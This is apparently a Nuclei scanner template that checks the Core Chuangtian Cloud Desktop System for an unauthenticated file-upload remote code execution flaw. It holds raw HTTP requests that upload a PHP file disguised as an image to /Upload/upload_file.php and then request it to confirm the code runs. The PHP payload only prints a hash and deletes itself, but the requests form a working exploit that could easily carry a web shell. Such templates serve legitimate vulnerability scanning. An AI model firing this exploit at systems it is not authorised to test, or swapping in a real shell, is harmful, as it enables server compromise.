http:
- matchers:
  - part: body_2
    type: word
    words:
    - '{{md5(string)}}'
  raw:
  - 'POST /Upload/upload_file.php?l=test HTTP/1.1

    Host: {{Hostname}}

    Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8

    Accept-Encoding: gzip, deflate

    Cookie: think_language=zh-cn; PHPSESSID_NAMED=h9j8utbmv82cb1dcdlav1cgdf6

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv


    ------WebKitFormBoundaryfcKRltGv

    Content-Disposition: form-data; name="file"; filename="{{randstr}}.php"

    Content-Type: image/avif


    <?php echo md5("{{string}}");unlink(__FILE__);?>

    ------WebKitFormBoundaryfcKRltGv--

    '
  - 'GET /Upload/test/{{randstr}}.php HTTP/1.1

    Host: {{Hostname}}

    '
id: core-chuangtian-cloud-rce
info:
  author: pikpikcu
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-77
  description: Core Chuangtian Cloud Desktop System is susceptible to remote code
    execution vulnerabilities.
  metadata:
    max-request: 2
  name: Core Chuangtian Cloud Desktop System - Remote Code Execution
  reference:
  - https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g
  severity: critical
  tags: rce,fileupload,intrusive,cloud,chuangtian,vuln
variables:
  string: core-chuangtian-cloud-rce
